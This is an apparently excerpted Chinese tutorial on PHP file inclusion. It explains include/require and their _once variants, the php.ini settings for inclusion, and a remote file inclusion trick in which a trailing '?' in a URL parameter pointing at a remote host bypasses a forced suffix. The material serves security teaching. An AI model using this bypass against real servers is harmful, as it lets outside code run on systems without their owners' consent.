File Include 任意文件包含

服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP脚本来执行，这会节省大量时间

1.文件包含函数

PHP中提供了四个文件包含语函数

函数 区别描述
include() 多次包含，多次执行；
如果包含失败，脚本产生警告，继续运行。
include_once() 只包含一次
如果包含失败，脚本产生警告，继续运行。
require() 多次包含，多次执行；
如果包含失败，脚本产生错误，结束执行。
require_once() 只包含一次
如果包含失败，脚本产生错误，结束执行。

2.相关配置

文件包含是PHP 的基本功能之一,有本地文件包含与远程文件包含之分,本地文件包含可以读取和打开本地文件,远程文件包含可以远程(方式)加载文件。

可以通过php.ini 中的选项进行配置。

多个路径可用冒号 :（Linux）或分号 ;（Windows）分隔。

5.2远程文件包含

文件包含函数如果指定后缀：

include $file.’/test/test.php’;

可以通过问号来绕过：

index.php?file=http://remoteaddr/remoteinfo.txt?

则包含的文件为http://remoteaddr/remoteinfo.txt?/test/test.php

问号后面的部分/test/test,php,也就是指定的后缀被当作query从而被绕过。
